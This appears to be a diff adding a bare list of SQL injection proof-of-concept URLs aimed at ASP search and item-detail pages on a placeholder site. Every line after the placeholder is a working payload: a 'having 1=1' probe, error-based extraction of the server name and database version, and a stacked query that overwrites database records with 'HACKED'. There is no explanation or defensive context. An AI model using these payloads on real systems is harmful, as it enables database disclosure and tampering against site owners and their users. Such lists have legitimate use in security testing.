@@ -1,0 +1,6 @@
+http://www.example.com/search.asp?sort=ni&amp;category=&amp;categoryname=&amp;kwsearch=&amp;nsearch=[SQL INJECTION]
+http://www.example.com/search.asp?sort=ni&amp;category=&amp;categoryname=&amp;kwsearch=&amp;nsearch=&#039;having 1=1--
+
+http://www.example.com/search.asp?sort=ni&amp;category=&amp;categoryname=&amp;kwsearch=&amp;nsearch=1&#039; or 1=convert(int,@@servername)--
+http://www.example.com/search.asp?sort=ni&amp;category=&amp;categoryname=&amp;kwsearch=&amp;nsearch=1&#039; or 1=convert(int,@@version)--
+http://www.example.com/itemdtl.asp?id=1-1&#039; UPDATE tblAd set descr= &#039;HACKED&#039; Where(ID= &#039;1&#039;);--
